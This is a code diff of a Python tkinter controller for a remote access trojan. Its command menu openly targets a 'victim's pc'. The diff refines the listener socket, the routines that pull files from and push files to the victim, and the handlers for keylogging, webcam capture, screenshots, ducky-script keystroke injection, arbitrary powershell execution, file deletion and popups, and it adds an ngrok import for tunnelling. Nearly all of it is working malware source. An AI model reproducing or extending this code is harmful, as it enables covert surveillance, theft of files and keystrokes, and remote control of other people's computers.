@@ -17,7 +17,7 @@ from tkinter import ttk
 import pyautogui
 from threading import Thread
 
-
+from pyngrok import ngrok
 
 
 
@@ -30,29 +30,34 @@ server_started = False
 button_state = DISABLED
 home_buttons = []
 line_breaker = '\n'+'='*210+'\n'
+header = '\n+===================================+\n'
+seper  = '\n+-----------------------------------+\n'
 
 
 
 
-def header(HOST,PORT):
+def Header(HOST,PORT):
 	display.insert(END,f'server started at {HOST}:{PORT}')
 	display.insert(END,"""\n\nmain commands:
 ----------------
--send text/binary file     --> to send files to vivtim's pc
--recieve text/binary file  --> to download files from victim's pc
+-send file                 --> to send files to vivtim's pc
+-recieve file              --> to download files from victim's pc
 -remove file/directory     --> removes the specified file/directory
 -screenshot                --> takes a screenshot of the victim's desktop
--screenshare               --> **work in progress**
+-take picture              --> takes a picture from the victim's webcam
+-screenshare               --> **work in progress**[streams the screen live]
+-stream camera             --> **work in progress**[sreams webcam live]
 -make directory            --> makes a directory
--extract zip               --> extracts the specified zipfile
+-remove file/folder        --> removes the specified file/directory
+-open                      --> opens a specified file/app
 -popup                     --> shows a popup on victim's pc
--open                      --> opens a file/app
--keyboard access           --> gives controll of the victim's keyboard
--script_mode          	   --> to run commands stored in a text file
--start/stop keylogger 	   --> starts/stops logging keyboard events
--<ls/cd/pwd>               --> lists all the files/changes dir/shows current dir
--<any powershell commands> --> executes powershell commands
--exit                      --> exit
+-extract zip               --> extracts the specified zipfile
+-archive folder			   --> archives the specified directory to a zipfile
+-execute ducky script      --> executes a ducky script      (keyboard access)
+-live keystrokes           --> live control of the keyboard (keyboard access)
+-keylogger 	               --> starts/stops logging keyboard events
+-linux commands            --> lists all the files/changes dir/shows current dir
+-powershell                --> executes powershell commands
 """)
 
 
@@ -350,12 +355,18 @@ def changetheme():
 def start(PORT):
 	global server,client
 		
-	HOST = get_ip_addresses()
+	#HOST = get_ip_addresses()
+	#HOST = '103.66.79.173'
+	#HOST = '0.0.0.0'
+	server_ip = ''#socket.gethostbyname('')
 	server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	server.bind((HOST, PORT))
-	header(HOST,PORT)
+	#server.bind((HOST, PORT))
+	server.bind((server_ip,PORT))
+	Header(server_ip,PORT)
 	#update_ip(HOST,PORT)
 	server.listen()
+
+	#public_url = ngrok.connect(port,'tcp',remote_addr=f"{HOST}:{PORT}").public_url
 
 	display.insert(END,'\n\nwaiting for a connection\n')
 	client,address = server.accept()
@@ -365,7 +376,7 @@ def start(PORT):
 
 
 
-def start_server(PORT=5064):
+def start_server(PORT=5059):
 	global server_started,btn_start_text,button_state,display_text
 	stop_text = 'server stopped'
 	if not server_started:
@@ -389,15 +400,19 @@ def start_server(PORT=5064):
 
 
 
-def send_b_file(path,name,size=1024):
+def send_file(path,name,size=1024):
 	try:
 		disable_buttons()
 
 		with open(path,'rb') as f:
-			client.send('send binary file'.encode('utf-8'))
+			client.send('send file'.encode('utf-8'))
 			client.recv(1024)
 			client.send(name.encode('utf-8'))
-			client.recv(1024)
+			state = client.recv(1024).decode('utf-8')
+			if state!='ready':
+				messagebox.showerror('error',state)
+				enable_buttons()
+				return
 
 			file_contents = f.read(size)
 			while file_contents:
@@ -408,98 +423,49 @@ def send_b_file(path,name,size=1024):
 		enable_buttons()
 	except Exception as err:
 		enable_buttons()
+		display.insert(END,'|             error             |\n+-------------------------------+\n\n\n')
 		messagebox.showerror('error',err)
 
 
-def recv_b_file(path,name,size=1024):
-	disable_buttons()
-	client.send(path.encode('utf-8'))
-	proceed = client.recv(1024).decode('utf-8')
-	if proceed!='ready':
-		messagebox.showerror('error',proceed)
-		enable_buttons()
-		return
+def recv_file(path,name,size=1024):
+	try:
+		client.send('recieve file'.encode('utf-8'))
+		disable_buttons()
+		client.send(path.encode('utf-8'))
+		proceed = client.recv(1024).decode('utf-8')
+		if proceed!='ready':
+			messagebox.showerror('error',proceed)
+			enable_buttons()
+			return
 
-
-
-	with open(name,'wb') as f:
-		file_contents = client.recv(size)
-
-		while file_contents:
-			f.write(file_contents)
+		with open(name,'wb') as f:
 			file_contents = client.recv(size)
 
-	reconnect()
-	enable_buttons()
-
-
-def send_t_file(path,name,size=1024):
-	try:
-		disable_buttons()
-		
-		with open(path,'r') as f:
-			client.send('send text file'.encode('utf-8'))
-			client.recv(1024)
-			client.send(name.encode('utf-8'))
-			client.recv(1024)
-
-			file_contents = f.read(size)
 			while file_contents:
-				client.send(file_contents.encode('utf-8'))
-				file_contents = f.read(size)
+				f.write(file_contents)
+				file_contents = client.recv(size)
 
-		client.send('~~exit~~'.encode('utf-8'))
+		reconnect()
 		enable_buttons()
+		display.insert(END,'|   recieved file succesfully   |\n+-------------------------------+\n\n\n')
 	except Exception as err:
 		enable_buttons()
+		display.insert(END,'|             error             |\n+-------------------------------+\n\n\n')
 		messagebox.showerror('error',err)
 
 
-def recv_t_file(path,name,size=1024):
-	disable_buttons()
-	client.send(path.encode('utf-8'))
-	
-	proceed = client.recv(1024).decode('utf-8')
-	if proceed!='ready':
-		messagebox.showerror('error',proceed)
-		enable_buttons()
-		return
 
-
-	with open(name,'w') as f:
-		file_contents = client.recv(size).decode('utf-8')
-		while file_contents:
-			if '~~exit~~' in file_contents:
-				f.write(file_contents.replace('~~exit~~',''))
-				break
-			f.write(file_contents)
-			file_contents = client.recv(size).decode('utf-8')
-	enable_buttons()
-
-
-
-def transfer_data(Type,mode,path,name):
+def transfer_data(Type,path,name):
 	if path=='' or name=='':
 		messagebox.showwarning('error','please specify a valid path/name')
 		return
-	display.insert(END,f"\n{Type}ing {path}({'binary' if mode else 'text'})...")
 
-	if Type=='send' and mode is True:
-		tsb = Thread(target=send_b_file,args=(path,name))
+	if Type=='send':
+		tsb = Thread(target=send_file,args=(path,name))
 		tsb.start()
-	elif Type=='send' and mode is False:
-		tst = Thread(target=send_t_file,args=(path,name))
-		tst.start()
-	elif Type=='recv' and mode is True:
-		client.send('recieve binary file'.encode('utf-8'))
-		trb = Thread(target=recv_b_file,args=(path,name))
+	elif Type=='recv':
+		trb = Thread(target=recv_file,args=(path,name))
 		trb.start()
-	elif Type=='recv' and mode is False:
-		client.send('recieve text file'.encode('utf-8'))
-		trt = Thread(target=recv_t_file,args=(path,name))
-		trt.start()
-
-	display.insert(END,f"\nwriting file as {name}\n"+line_breaker)
 
 
 def extract(path,name):
@@ -511,8 +477,8 @@ def extract(path,name):
 	client.send(path.encode('utf-8'))
 	client.recv(1024)
 	client.send(name.encode('utf-8'))
-	text = f'\nextracted {path} to {name}'
-	display.insert(END,text+line_breaker)
+	text = seper+'|    probably extracted the file    |'
+	display.insert(END,text+header+'\n')
 
 def archive(path,name):
 	if path=='' or name=='':
@@ -523,9 +489,10 @@ def archive(path,name):
 	client.send(path.encode('utf-8'))
 	client.recv(1024)
 	client.send(name.encode('utf-8'))
+	client.recv(1024)
 
-	text = f'\narchived {path} to {name}'
-	display.insert(END,text+line_breaker)
+	text = seper+'|    probably archived the file     |'
+	display.insert(END,text+header+'\n')
 
 
 def stream():
@@ -541,7 +508,12 @@ def update_dir(Type,name):
 		client.send('make directory'.encode('utf-8'))
 		client.recv(1024)
 		client.send(name.encode('utf-8'))
-		display.insert(END,'\nmade directory succesfully!\n'+line_breaker)
+		result = client.recv(1024).decode('utf-8')
+		if result=='success':
+			display.insert(END,'|   folder made succesfully    |\n+==============================+\n\n')
+		else:
+			display.insert(END,'|              error           |\n+==============================+\n\n')
+			messagebox.showerror('error',result)
 
 	elif Type=='remove folder':
 		client.send('remove directory'.encode('utf-8'))
@@ -549,8 +521,9 @@ def update_dir(Type,name):
 		client.send(name.encode('utf-8'))
 		result = client.recv(1024).decode('utf-8')
 		if result=='success':
-			display.insert(END,'\nremoved directory succesfully!\n'+line_breaker)
+			display.insert(END,'|removed directory succesfully |\n+==============================+\n\n')
 		else:
+			display.insert(END,'|              error           |\n+==============================+\n\n')
 			messagebox.showerror('error',result)
 
 	elif Type=='remove file':
@@ -559,8 +532,9 @@ def update_dir(Type,name):
 		client.send(name.encode('utf-8'))
 		result = client.recv(1024).decode('utf-8')
 		if result=='success':
-			display.insert(END,'\nremoved file succesfully!\n'+line_breaker)
+			display.insert(END,'|   removed file succesfully   |\n+==============================+\n\n')
 		else:
+			display.insert(END,'|              error           |\n+==============================+\n\n')
 			messagebox.showerror('error',result)
 
 def openf(path):
@@ -573,8 +547,9 @@ def openf(path):
 	client.send(path.encode('utf-8'))
 	result = client.recv(1024).decode('utf-8')
 	if result=='success':
-		display.insert(END,f'\nopened {os.path.basename(path)}{line_breaker}')
+		display.insert(END,'|      opened succesfully       |\n+===============================+\n\n\n')
 	else:
+		display.insert(END,'|            error              |\n+===============================+\n\n\n')
 		messagebox.showerror('error',result)
 	enable_buttons()
 	
@@ -623,6 +598,10 @@ def stop_kl():
 
 
 def popup_show(title,message,ptype):
+	if title=='' or message=='' or ptype=='':
+		messagebox.showwarning('error','fill with valid values!')
+		return
+	disable_buttons()
 	client.send('popup'.encode('utf-8'))
 	client.recv(1024).decode('utf-8')
 	
@@ -632,7 +611,13 @@ def popup_show(title,message,ptype):
 	client.recv(1024).decode('utf-8')
 	client.send(ptype.encode('utf-8'))
 	client.recv(1024).decode('utf-8')
-	display.insert(END,'\npopup showed'+line_breaker)
+
+	result = client.recv(1024).decode('utf-8')
+	if result=='success':
+		display.insert(END,'\npopup showed'+line_breaker)
+	else:
+		messagebox.showerror('error',result)
+	enable_buttons()
 
 
 
@@ -771,19 +756,10 @@ def fullscreen(filename):
 
 
 def transfer_file(Type):
-	state = True
-	text = f'\n{line_breaker}\n{Type} file - option selected\n1)enter the path of the file\n2)enter the name for the file\n3)select the mode of the file'
-	display.insert(END,text)
+	t1 = f'+===============================+\n|{Type} file - option selected    |\n+===============================+\n'
+	t2 =  '|1)enter the path of the file   |\n|2)enter the name for the file  |\n'
+	display.insert(END,t1+t2+'+-------------------------------+\n')
 	widgetdestroyer(controlls_frame)
-
-	def change_state():
-		nonlocal state
-		state = not state
-		if state:
-			btn_mode.config(text='binary')
-		else:
-			btn_mode.config(text='text')
-
 
 	label_path = Label(controlls_frame,text='path :',**kwargs)
 	label_name = Label(controlls_frame,text='name :',**kwargs)
@@ -791,22 +767,21 @@ def transfer_file(Type):
 	entry_path = Entry(controlls_frame,width=50,**kwargs)
 	entry_name = Entry(controlls_frame,width=50,**kwargs)
 
-	btn_mode = Button(controlls_frame,text='binary',bg=bg,fg=fg,font=font_16,command=change_state)
-	btn_type = Button(controlls_frame,text=Type,bg=bg,fg=fg,font=font_16,command=lambda:transfer_data(Type,state,entry_path.get(),entry_name.get()))
+	btn_type = Button(controlls_frame,text=Type,bg=bg,fg=fg,font=font_16,command=lambda:transfer_data(Type,entry_path.get(),entry_name.get()))
 
 
 	label_path.grid(row=0,column=0, sticky='NSW')
 	entry_path.grid(row=0,column=1, sticky='NSEW')
 	label_name.grid(row=1,column=0, sticky='NSW')
 	entry_name.grid(row=1,column=1, sticky='NSEW')
-	btn_mode.grid(row=2,column=0,sticky='SW')
 	btn_type.grid(row=2,column=1,sticky='SE')
 
 
 def extract_zip():
 	state = True
-	text = '\n\nextract zip - option selected\n1)enter the path of the zip file\n2)enter the name for the directory for the zip to be extracted in'
-	display.insert(END,line_breaker+text)
+	t1 = header+'|  extract zip - option selected    |'+header+'|1)enter the path of the zip file   |\n'
+	t2 = '|2)enter the name for the directory |\n|for the zip to be extracted in     |'
+	display.insert(END,t1+t2)
 	widgetdestroyer(controlls_frame)
 
 
@@ -827,8 +802,9 @@ def extract_zip():
 
 def archive_dir():
 	state = True
-	text = '\n\narchive directory - option selected\n1)enter the path of the directory\n2)enter the name for the zipfile'
-	display.insert(END,line_breaker+text)
+	t1 = header+'|archive directory - option selected|'+header+'|1)enter the path of the directory  |\n'
+	t2 = '|2)enter the name for the zip file  |'
+	display.insert(END,t1+t2)
 	widgetdestroyer(controlls_frame)
 
 
@@ -849,9 +825,18 @@ def archive_dir():
 
 def update_items(Type):
 	widgetdestroyer(controlls_frame)
-	display.insert(END,f'\n{line_breaker}{Type}\nenter the path of the {"file" if Type=="remove file" else "directory"}')
 	label_name = Label(controlls_frame,text='name :',**kwargs)
 	entry_name = Entry(controlls_frame,width=50,**kwargs)
+
+	if Type=='make folder':
+		t1 = '\n+==============================+\n|        make directory        |\n+==============================+\n|enter the name for the folder |\n+------------------------------+\n'
+		display.insert(END,'\n'+t1)
+	elif Type=='remove folder':
+		t1 = '\n+==============================+\n|      remove directory        |\n+==============================+\n|enter the name for the folder |\n+------------------------------+\n'
+		display.insert(END,'\n'+t1)
+	elif Type=='remove file':
+		t1 = '\n+==============================+\n|         remove file          |\n+==============================+\n|enter the name for the file   |\n+------------------------------+\n'
+		display.insert(END,'\n'+t1)
 
 	btn_type = Button(controlls_frame,text=Type,bg=bg,fg=fg,font=font_16,command=lambda:update_dir(Type,entry_name.get()))
 
@@ -863,7 +848,8 @@ def update_items(Type):
 
 def open_file():
 	widgetdestroyer(controlls_frame)
-	display.insert(END,f'\n{line_breaker}\nenter the path of the file')
+	t = '\n+===============================+\n|             open              |\n+===============================+\n|enter the path of the file/app |\n'
+	display.insert(END,t+'+-------------------------------+\n')
 	label_path = Label(controlls_frame,text='path :',**kwargs)
 	entry_path = Entry(controlls_frame,width=50,**kwargs)
 
@@ -899,7 +885,9 @@ def linux():
 
 def powershell():
 	widgetdestroyer(controlls_frame)
-	display.insert(END,'\n\npowershell mode activated')
+	t1 = '\n+===================================+\n|         powershell mode           |\n+===================================+\n'
+	t2 = '|execute any powershell command!    |\n+===================================+\n'
+	display.insert(END,t1+t2)
 	label_command = Label(controlls_frame,text='command :',**kwargs)
 	entry_command = Entry(controlls_frame,width=50,**kwargs)
 
@@ -944,7 +932,9 @@ def k_live():
 
 def keyboard():
 	widgetdestroyer(controlls_frame)
-	display.insert(END,'\n'+line_breaker)
+	t1 = header+'|           keyboard access         |'+header
+	t2 = '|1)execute a duckyscript            |\n|2)send live keystrokes (no hotkeys)|'+seper
+	display.insert(END,t1+t2)
 
 	btn_ducky = Button(controlls_frame,text='execute ducky script',bg=bg,fg=fg,font=font_16,command=lambda:k_ducky())
 	btn_live = Button(controlls_frame,text='live mode',bg=bg,fg=fg,font=font_16,command=lambda:k_live())
@@ -976,7 +966,7 @@ def popup():
 	err_type   = ttk.Combobox(controlls_frame,value=('error','warning','info'),justify=CENTER)
 
 	btn_sp  = Button(controlls_frame,text='show popup',bg=bg,fg=fg,font=font_16,
-		command=lambda:popup_show(entry_title.get(),entry_msg.get(),err_type.get()))
+		command=lambda:Thread(target=popup_show,args=(entry_title.get(),entry_msg.get(),err_type.get())).start())
 
 
 	label_title.grid(row=0,column=0, sticky='NSW')
